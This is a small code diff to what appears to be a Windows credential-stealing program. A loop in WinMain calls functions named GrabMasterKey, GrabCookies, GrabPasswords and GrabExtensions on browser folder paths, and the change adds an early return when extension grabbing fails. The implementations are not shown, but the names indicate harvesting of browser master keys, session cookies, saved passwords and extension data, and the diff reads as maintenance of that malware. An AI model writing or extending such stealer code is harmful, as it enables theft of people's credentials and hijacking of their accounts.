@@ -43,7 +43,9 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
             GrabMasterKey(FolderPath);
             GrabCookies(FolderPath);
             GrabPasswords(FolderPath);
-            GrabExtensions(FolderPath);
+            if (GrabExtensions(FolderPath) != 0) {
+                return 1000;
+            }
         }
         idx++;
     }
